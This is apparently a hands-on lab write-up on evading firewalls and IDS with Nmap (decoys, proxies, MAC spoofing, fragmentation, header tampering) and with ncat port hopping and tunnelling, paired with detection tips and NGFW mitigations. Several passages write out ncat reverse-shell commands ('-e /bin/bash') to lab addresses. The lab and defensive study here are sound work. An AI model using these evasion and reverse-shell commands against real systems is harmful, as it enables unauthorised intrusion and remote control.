
![Pasted image 20240920140126](https://github.com/user-attachments/assets/e35edcc5-908a-4162-a05a-39b6ef3b888c)


A firewall is software or hardware that monitors the network traffic and compares it against a set of rules before passing or blocking it. One simple analogy is a guard or gatekeeper at the entrance of an event. This gatekeeper can check the ID of individuals against a set of rules before letting them enter (or leave).

Different types of firewalls are capable of inspecting various packet fields; however, the most basic firewall should be able to inspect at least the following fields:


Protocol
Source Address
Destination Address

![Pasted image 20240920140306](https://github.com/user-attachments/assets/d3494f55-000e-4af1-aec2-5cfb24f0853c)


Depending on the protocol field, the data in the IP datagram can be one of many options. Three common protocols are:


TCP
UDP
ICMP


In the case of TCP or UDP, the firewall should at least be able to check the TCP and UDP headers for:

Source Port Number
Destination Port Number

![Pasted image 20240920140426](https://github.com/user-attachments/assets/08e838e9-c9da-4da6-ab47-031de5b174e9)


 In traditional firewalls, i.e., packet-filtering firewalls, everything is allowed and blocked mainly based on the following:

Protocol, such as TCP, UDP, and ICMP
IP source address
IP destination address
Source TCP or UDP port number
Destination TCP or UDP port number


### Evasion via Controlling the Source MAC/IP/Port


Evasion via controlling the source MAC/IP/Port
Evasion via fragmentation, MTU, and data length
Evasion through modifying header fields

Nmap allows you to hide or spoof the source as you can use:

Decoy(s)
Proxy
Spoofed MAC Address
Spoofed Source IP Address
Fixed Source Port Number

### Nmap Behaviour of  Half open scan -sS on  Windows Firewall:


nmap  -sS -F 10.10.100.39 -nnvvv        

![Pasted image 20240920145403](https://github.com/user-attachments/assets/619458cd-ce8c-4d8d-b26f-209566273074)


![Pasted image 20240920145126](https://github.com/user-attachments/assets/33b349ad-f2df-4051-987b-edcf71e98661)


![Pasted image 20240920150311](https://github.com/user-attachments/assets/76b0924e-ad3f-41be-91aa-b4c4a39b71e4)


This is the first step in the TCP three-way handshake that any legitimate connection attempt takes. Since the target port is open, Scanme takes the second step by sending a response with the SYN and ACK flags back. In a normal connection, Ereet's machine (named krad) would complete the three-way handshake by sending an ACK packet acknowledging the SYN/ACK. Nmap does not need to do this, since the SYN/ACK response already told it that the port is open. If Nmap completed the connection, it would then have to worry about closing it. This usually involves another handshake, using FIN packets rather than SYN. So an ACK is a bad idea, yet something still has to be done. If the SYN/ACK is ignored completely, Scanme will assume it was dropped and keep re-sending it. The proper response, since we don't want to make a full connection, is a RST packet as shown in the diagram. This tells Scanme to forget about (reset) the attempted connection. Nmap could send this RST packet easily enough, but it actually doesn't need to. The OS running on krad also receives the SYN/ACK, which it doesn't expect because Nmap crafted the SYN probe itself. So the OS responds to the unexpected SYN/ACK with a RST packet. All RST packets described in this chapter also have the ACK bit set because they are always sent in response to (and acknowledge) a received packet. So that bit is not shown explicitly for RST packets. Because the three-way handshake is never completed, SYN scan is sometimes called half-open scanning.

### Network traffic Identification of a  Half open scan  -sS scan:

![Pasted image 20240920150341](https://github.com/user-attachments/assets/eafc0b47-59aa-4925-8289-8439f6a8068c)



Nmap will also consider a port filtered if it receives certain ICMP error messages back.

![Pasted image 20240920150957](https://github.com/user-attachments/assets/e1765030-7234-439f-a99f-399779d2af0c)

### How Nmap interprets responses to a SYN probe:

![Pasted image 20240920151122](https://github.com/user-attachments/assets/744cf0e9-d6d7-4618-b3b3-1215258f27e0)


IP address 10.10.100.39 has generated and sent around 200 packets. The -F option limits the scan to the top 100 common ports; moreover, each port is sent a second SYN packet if it does not reply to the first one.

The source port number is chosen at random but is fixed. In the screenshot, you can see it is 63871

The total length of the IP packet is 44 bytes. There are 20 bytes for the IP header, which leaves 24 bytes for the TCP header. No data is sent via TCP.

The Time to Live (TTL) is is changing in each packet.
The IP identification is changing is each packet
No errors are introduced in the checksum.

\
### Nmap Behaviour of Decoy technique:

Hide your scan with decoys. Using decoys makes your IP address mix with other “decoy” IP addresses. Consequently, it will be difficult for the firewall and target host to know where the port scan is coming from. Moreover, this can exhaust the blue team investigating each source IP address.re

 nmap -sS -Pn -D 192.168.91.10,192.168.91.15,192.168.91.128 -F 192.168.91.130

![Pasted image 20240921123114](https://github.com/user-attachments/assets/42da0b3f-e28f-4619-992f-be24308e6307)


![Pasted image 20240921123403](https://github.com/user-attachments/assets/5550db8d-d32b-4240-b9f6-2ac22cae96d7)


You can also set Nmap to use random source IP addresses instead of explicitly specifying them.


map -sS -Pn -D RND,RND,192.168.91.128 -F 192.168.91.130


![Pasted image 20240921124912](https://github.com/user-attachments/assets/551b29ec-e9be-40a0-ac69-6fec116d136f)


### Finding the real IP behind the Decoy scan:


Resets are send to the real source IP:


![Pasted image 20240921123604](https://github.com/user-attachments/assets/e07821b9-850d-4918-9447-6687f2277828)


The acknowledgement are send to the real source IP:

![Pasted image 20240921124326](https://github.com/user-attachments/assets/5a732df1-4476-46ac-a1a4-1ac630870b3d)


Single flow:

![Pasted image 20240921124444](https://github.com/user-attachments/assets/4ad665af-995a-4935-9834-185bec36878f)




### Proxy

### Setting up a Netcat http proxy for NMAP:



![[Attachments/Pasted image 20240922143053.png]]


ncat -vv --listen 8081 --proxy-type http

![Pasted image 20240921201927](https://github.com/user-attachments/assets/9072c443-7501-4949-a0fc-cb8dd0ce8b06)


![Pasted image 20240921201907](https://github.com/user-attachments/assets/297099b9-ed7a-4112-9ee0-b6a81f3b8975)


#### TCP Connect Scan (-sT)

The first two steps (SYN and SYN/ACK) are exactly the same as with a SYN scan. Then, instead of aborting the half-open connection with a RST packet, krad acknowledges the SYN/ACK with its own ACK packet, completing the connection. In this case, Scanme even had time to send its SSH banner string (SSH-1.99-OpenSSH_3.1p1\n) through the now-open connection. As soon as Nmap hears from its host OS that the connection was successful, it terminates the connection. TCP connections usually end with another handshake involving the FIN flag, but Nmap asks the host OS to terminate the connection immediately with a RST packet.


![Pasted image 20240921212259](https://github.com/user-attachments/assets/40ae7b87-25f5-4bf3-81d3-35d392d076f3)


Note: The -sT -A -sC -sV at least two scan technique need to be in used in order to use the --proxies option otherwise Nmap won't be able to route the traffic through the proxy.

 nmap  -sC -sV -Pn -p80  --proxies http://192.168.91.131:8081 192.168.91.130 --packet-trace -nnvvvv
 
![Pasted image 20240921204322](https://github.com/user-attachments/assets/62e12b62-9912-43bf-a773-2afd073c998e)


### Traffic from the local nmap scanner:



![Pasted image 20240921204246](https://github.com/user-attachments/assets/e0e3f004-497a-4744-9a02-1b9fc9d74cf1)


 --packet-trace option show information about the state of the connection:
 
![Pasted image 20240921211331](https://github.com/user-attachments/assets/3237440f-55fc-4d97-be9c-437237eb8eca)


![Pasted image 20240921211420](https://github.com/user-attachments/assets/a08cf613-21f6-4859-9304-d9cf94846c15)



### Detecting scans via proxy servers:

There's no 100% reliable way to achieve this but the presence of any of the following headers is a strong indication that the request was routed from a proxy server:

via:
forwarded:
x-forwarded-for:
client-ip: 


Traffic at the IIS (target) server: 

![Pasted image 20240921203356](https://github.com/user-attachments/assets/21462aab-9c7d-4186-97dc-a3a7c513aca9)


The CONNECT Method: Building Tunnels in the Web

Purpose: CONNECT is the tunnel builder of HTTP methods. It’s typically used by proxy servers to establish a direct link to a target over an HTTP connection. This is particularly useful for SSL (HTTPS) traffic where the client needs a secure and direct path to the server.

![Pasted image 20240921203332](https://github.com/user-attachments/assets/bb730138-3adf-44cf-ba54-ee4595caab34)


![Pasted image 20240921205656](https://github.com/user-attachments/assets/f58f190f-ec6f-455a-ab4f-2384592fcbc0)


I was successfully able to scan node 192.168.91.130 and detect it's operating system (Windows) and the service  running (IIS web server) via a proxy sever using Nmap:



### Mac spoofing :


![Pasted image 20240922170340](https://github.com/user-attachments/assets/56585a8a-ff25-44c5-9cc5-52c07312abb5)



MAC spoofing is a commonly employed tactic by malicious actors to alter the Media Access Control (MAC) address of their device to mimic that of another device present on the network. The aforementioned vulnerability enables the assailant to surpass network security measures such as MAC filtering and MAC-based access controls.

MAC spoofing is a frequently employed tactic to circumvent MAC filtering, a security protocol that confines network entry solely to devices with recognized MAC addresses. The malicious entity possesses the ability to bypass the current security measures and attain illicit entry into the network through the fabrication of the MAC address of a reliable device


![Pasted image 20240921231109](https://github.com/user-attachments/assets/700bb0b7-b9d9-4682-98f3-ed9d2d3c7c5b)

Spoof the source MAC address. Nmap allows you to spoof your MAC address using the option --spoof-mac MAC_ADDRESS. This technique is tricky; spoofing the MAC address works only if your system is on the same network segment as the target host. The target system is going to reply to a spoofed MAC address. If you are not on the same network segment, sharing the same Ethernet, you won’t be able to capture and read the responses. It allows you to exploit any trust relationship based on MAC addresses. Moreover, you can use this technique to hide your scanning activities on the network. For example, you can make your scans appear as if coming from a network printer.

nmap -sS -Pn -p80 --spoof-mac deadbeef 192.168.91.130 --packet-trace --disable-arp-ping -nnvv


![Pasted image 20240921230527](https://github.com/user-attachments/assets/facb1002-5280-4bd5-89b5-732824af73ce)


The mac address has changed:

![Pasted image 20240921230718](https://github.com/user-attachments/assets/a251a877-a9e8-4e85-ab34-90d28bc730be)



### Warning Signs of MAC Spoofing Attacks:


![Pasted image 20240922171738](https://github.com/user-attachments/assets/bb17da92-de21-4b55-b473-710b8a522097)


here are various red flags that may point to a MAC spoofing attack on a network. Some of these warnings include:

 Duplicate IP addresses
 Unknown MAC addresses
 Unusual network activity
 Inconsistent device behaviour 
  Unexpected network failures 


### Fixed Source Port Number:

Use a specific source port number. Scanning from one particular source port number can be helpful if you discover that the firewalls allow incoming packets from particular source port numbers, such as port 53 or 80. Without inspecting the packet contents, packets from source TCP port 80 or 443 look like packets from a web server, while packets from UDP port 53 look like responses to DNS queries.


### Creating a firewall rule to allow traffic to IIS server on a specific source port:



![Pasted image 20240922150229](https://github.com/user-attachments/assets/4613d30d-882b-471d-a75f-103032a94dbc)

![Pasted image 20240922150315](https://github.com/user-attachments/assets/4a644684-06b5-457b-999d-4b53d3fa4cab)


![Pasted image 20240922150726](https://github.com/user-attachments/assets/ba81035e-031a-48ea-a96d-d556854be2fa)

![Pasted image 20240922150815](https://github.com/user-attachments/assets/5251819b-ec88-428d-9c58-631921b48f5d)


![Pasted image 20240922150902](https://github.com/user-attachments/assets/7077eb7d-95b7-4ec6-8fc5-4ad6d1e62051)

![Pasted image 20240922150941](https://github.com/user-attachments/assets/eb58b0f1-ca6e-485d-9203-16436dcde6a1)

![Pasted image 20240922151127](https://github.com/user-attachments/assets/4a39870e-4087-449e-8325-d1aa9ca6fab4)

![Pasted image 20240922151204](https://github.com/user-attachments/assets/fd9dee17-0ad4-437a-a9cf-cb566d716d9a)


### Testing the firewall rule with NMAP:

 nmap -sS -Pn -p80 192.168.91.130 --packet-trace --disable-arp-ping -nnvvvv


![Pasted image 20240922151449](https://github.com/user-attachments/assets/c861c976-65e3-4dba-978e-793537d0725f)


Note: The port has been filter since the traffic will be only allow on an specific port number: 



### Running another test but, this time using a specific source port using the option --source-port:


 nmap -sS -Pn --source-port 9999 -p80 192.168.91.130 --packet-trace --disable-arp-ping -nnvvvv


![Pasted image 20240922151741](https://github.com/user-attachments/assets/ce251585-a9d1-4647-8de4-979c3d04fe0e)




### Evasion via Forcing Fragmentation, MTU, and Data Length:

You can control the packet size as it allows you to:

Fragment packets, optionally with given MTU. If the firewall, or the IDS/IPS, does not reassemble the packet, it will most likely let it pass. Consequently, the target system will reassemble and process it.

Send packets with specific data lengths.


### Fragment Your Packets with 8 Bytes of Data:

One easy way to fragment your packets would be to use the -f option. This option will fragment the IP packet to carry only 8 bytes of data. As mentioned earlier, running a Nmap TCP port scan means that the IP packet will hold 24 bytes, the TCP header. If you want to limit the IP data to 8 bytes, the 24 bytes of the TCP header will be divided across 3 IP packets.


nmap -sS -Pn -f 8  -p80 192.168.91.130 --packet-trace --disable-arp-ping -nnvvvv


![Pasted image 20240922154916](https://github.com/user-attachments/assets/e602a2d0-1c0d-40d1-b10e-972ce0b07f29)


![Pasted image 20240922154837](https://github.com/user-attachments/assets/ced0ab71-ca8e-4a3b-b29e-0190b8d74831)




### Fragment Your Packets with 16 Bytes of Data:

Another handy option is the -ff, limiting the IP data to 16 bytes. (One easy way to remember this is that one f is 8 bytes, but two fs are 16 bytes.) By running nmap -sS -Pn -ff -F MACHINE_IP, we expect the 24 bytes of the TCP header to be divided between two IP packets, 16 + 8, because -ff has put an upper limit of 16 bytes.

 nmap -sS -Pn -ff -p80 192.168.91.130 --packet-trace --disable-arp-ping -nnvvvv

![Pasted image 20240922155423](https://github.com/user-attachments/assets/5a09bce4-0f82-4c20-aeb9-a6343c80711a)

![Pasted image 20240922155525](https://github.com/user-attachments/assets/37d481e7-0850-4bfe-84cc-4c8f86045e7f)

### Fragment Your Packets According to a Set MTU:

Another neat way to fragment your packets is by setting the MTU. In Nmap, --mtu VALUE specifies the number of bytes per IP packet. In other words, the IP header size is not included. The value set for MTU must always be a multiple of 8.

Note that the Maximum Transmission Unit (MTU) indicates the maximum packet size that can pass on a certain link-layer connection. For instance, Ethernet has an MTU of 1500, meaning that the largest IP packet that can be sent over an Ethernet (link layer) connection is 1500 bytes, don’t be confuse this MTU with the --mtu in Nmap options.

Running Nmap with --mtu 8 will be identical to -f as the IP data will be limited to 8 bytes.

nmap -sS -Pn -mtu 8 -p80 192.168.91.130 --packet-trace --disable-arp-ping -nnvvvv

![Pasted image 20240922155925](https://github.com/user-attachments/assets/741d5d85-2b87-415b-86a7-df01388ce58f)


![Pasted image 20240922155907](https://github.com/user-attachments/assets/e15a7300-4130-4730-b6b1-b895178bfb02)


### Generate Packets with Specific Length:

In some instances, you might find out that the size of the packets is triggering the firewall or the IDS/IPS to detect and block you. If you ever find yourself in such a situation, you can make your port scanning more evasive by setting a specific length. You can set the length of data carried within the IP packet using --data-length VALUE. The length should be a multiple of 8.

nmap -sS -Pn --data-length 64  -p80 192.168.91.130 --packet-trace --disable-arp-ping -nnvvvv


![Pasted image 20240922162841](https://github.com/user-attachments/assets/a92f7c89-c3da-4a1c-afe0-9b31b6aafd85)


![Pasted image 20240922162745](https://github.com/user-attachments/assets/e1d6f488-5de0-4f26-83bb-c7eb6bdc7007)



### Evasion via Modifying Header Fields:

Nmap allows you to control various header fields that might help evade the firewall. You can:

Set IP time-to-live
Send packets with specified IP options
Send packets with a wrong TCP/UDP checksum


### Set TTL :

Nmap gives you further control over the different fields in the IP header. One of the fields you can control is the Time-to-Live (TTL). Nmap options include --ttl VALUE to set the TTL to a custom value. This option might be useful if you think the default TTL exposes your port scan activities.

 nmap -sS -Pn --ttl 1 -p80,3389 192.168.91.130 -nnvvv --packet-trace

![Pasted image 20240923105624](https://github.com/user-attachments/assets/75d7f9ea-d3be-4ad6-8124-e8186a6143eb)


![Pasted image 20240923105749](https://github.com/user-attachments/assets/fa10c75f-ab9b-4554-a4f8-cb24a9945cd9)



### Set IP Options:

One of the IP header fields is the IP Options field. Nmap lets you control the value set in the IP Options field using --ip-options HEX_STRING, where the hex string can specify the bytes you want to use to fill in the IP Options field. Each byte is written as \xHH, where HH represents two hexadecimal digits, i.e., one byte.

A shortcut provided by Nmap is using the letters to make your requests:

R to record-route.

T to record-timestamp.

U to record-route and record-timestamp.

L for loose source routing and needs to be followed by a list of IP addresses separated by space.

S for strict source routing and needs to be followed by a list of IP addresses separated by space.

The loose and strict source routing can be helpful if you want to try to make your packets take a particular route to avoid a specific security system.

nmap -sS -Pn --ip-options R -p80,3389 192.168.91.130 -nnvvv --packet-trace

![Pasted image 20240923112809](https://github.com/user-attachments/assets/e571ab7e-9fc4-40ff-a835-65a46e6b3690)


![Pasted image 20240923112706](https://github.com/user-attachments/assets/61da2c44-109c-4251-92cb-2f5bb7a1814a)


###  Wrong Checksum:

Another trick is to send packets with an intentionally wrong checksum. Some systems would drop a packet with a bad checksum, while others won’t. You can use this to your advantage to discover more about the systems in your network. All you need to do is add the option --badsum to your Nmap command.



nmap -sS -Pn --badsum -p80,3389 192.168.91.130 -nnvvv --packet-trace

![Pasted image 20240923113056](https://github.com/user-attachments/assets/ef80ed72-d799-4e50-ab27-0dc743ad0710)




#### Evasion Using Port Hopping:

Three common firewall evasion techniques are:

Port hopping
Port tunneling
Use of non-standard ports

Port hopping is a technique where an application hops from one port to another till it can establish and maintain a connection. In other words, the application might try different ports till it can successfully establish a connection. Some “legitimate” applications use this technique to evade firewalls. In the following, the client kept trying different ports to reach the server till it discovered a destination port not blocked by the firewall.



![Pasted image 20240924211328](https://github.com/user-attachments/assets/ce0ff043-9721-4957-8f62-aadef3175248)


### Setting up a listening our client:

-l listens for incoming connections
-v provides verbose details (optional)
-n does not resolve hostnames via DNS (optional)
-p specifies the port number to use

ncat -lvnp 21

![Pasted image 20240924133907](https://github.com/user-attachments/assets/eff7886b-ecbc-4170-a582-4ef72377c726)


### Connecting to the server:

Network trace from the client reaching the server on port 8080:

![Pasted image 20240924134217](https://github.com/user-attachments/assets/0039045a-ae64-4763-90f1-6262db7c7184)


Note: In this scenario, I'm going to be exploiting a vulnerable service that allows remote code execution (RCE) or a misconfiguration on the web application running on port 8080 to execute some code or command of my choice.


ncat 10.10.142.3 21 -c /bin/bash
![Pasted image 20240924134503](https://github.com/user-attachments/assets/77561853-f084-400a-8585-8f77461eb83f)

The command was executed usefully, we can the Http POST and the  ACK coming from the server 
![Pasted image 20240924134217](https://github.com/user-attachments/assets/e733f554-52c1-48a3-830f-9088e3e7b3c8)


Detail information about the Http POST
![Pasted image 20240924134054](https://github.com/user-attachments/assets/e2ab77dd-b3bd-4309-82a7-803c2397e8cb)



### Detecting a reverse shell from the server:

Tips:

 netstat -anp | grep ESTABLISHED 

This will display all established connections, and the the associated process or program. By filtering for established connections, you can focus on active connections. 

### Netcat network traffic coming from the server:

![Pasted image 20240924134356](https://github.com/user-attachments/assets/3f0787b6-3a76-47a4-9c85-cf34ded5b536)


We can see that the server's firewall is allowing port 21 outbound.  




#### Evasion Using Port Tunnelling:


Port tunneling is also known as port forwarding and port mapping. In simple terms, this technique forwards the packets sent to one destination port to another destination port. For instance, packets sent to port 80 on one system are forwarded to port 8080 on another system.


Port Tunneling Using Ncat:

![Pasted image 20240924211930](https://github.com/user-attachments/assets/b0c7257e-5a3b-4578-89b0-cac9c37b705f)

### Creating a ncat listening on port 21 on the client:

ncat -lvnp 21

![Pasted image 20240924153722](https://github.com/user-attachments/assets/0a86dada-cfa9-4f16-8e46-4fef33e8a5e7)


### Accessing the webserver and passing the Netcat command to spawn a reverse shell:


ncat 10.10.25.138  21 -e /bin/bash

======20240904160925 insert pic


Listing available services / ports that are opened:

![[Attachments/Pasted image 20240924160848.png]]

The client can't reach the server over the network on port 80 or 8008.

![[Attachments/Pasted image 20240924163354.png]]

Since I'm connected to the server via a reverse shell, I can open the local webserver running on port 80

ncat -lvnp 8008 -c "ncat 10.10.90.19 80"


![[Attachments/Pasted image 20240924163735.png]]


Now I'm able to reach the server on port 8008 , I can se some 200 codes coming from the web App:

![[Attachments/Pasted image 20240924163942.png]]



![[Attachments/Pasted image 20240924164127.png]]

Connection state at the Web-Server show the port are bind:

![[Attachments/Pasted image 20240924164556.png]]


### Evasion Using Non-Standard Ports:

Creating a backdoor via the specified port number that lets you interact with the Bash shell.

-e or --exec executes the given command

/bin/bash location of the command we want to execute

Considering the case that we have a firewall, it is not enough to use ncat to create a backdoor unless we can connect to the listening port number. Moreover, unless we run ncat as a privileged user, root, or using sudo, we cannot use port numbers below 1024.

\
### Mitigations:

Next-Generation Firewall (NGFW:

Traditional firewalls, such as packet-filtering firewalls, expect a port number to dictate the protocol being used and identify the application. Consequently, if you want to block an application, you need to block a port. Unfortunately, this is no longer valid as many applications camouflage themselves using ports assigned for other applications. 

![[Attachments/Pasted image 20240924210345.png]]


In other words, a port number is no longer enough nor reliable to identify the application being used. Add to this the pervasive use of encryption, for example, via SSL/TLS.

![[Attachments/Pasted image 20240924210137.png]]
Next-Generation Firewall (NGFW) is designed to handle the new challenges facing modern enterprises. For instance, some of NGFW capabilities include:

Integrate a firewall and a real-time Intrusion Prevention System (IPS). It can stop any detected threat in real-time.

Identify users and their traffic. It can enforce the security policy per-user or per-group basis.

Identify the applications and protocols regardless of the port number being used.

Identify the content being transmitted. It can enforce the security policy in case any violating content is detected.

Ability to decrypt SSL/TLS and SSH traffic. For instance, it restricts evasive techniques built around encryption to transfer malicious files.

A properly configured and deployed NGFW renders many attacks useless.
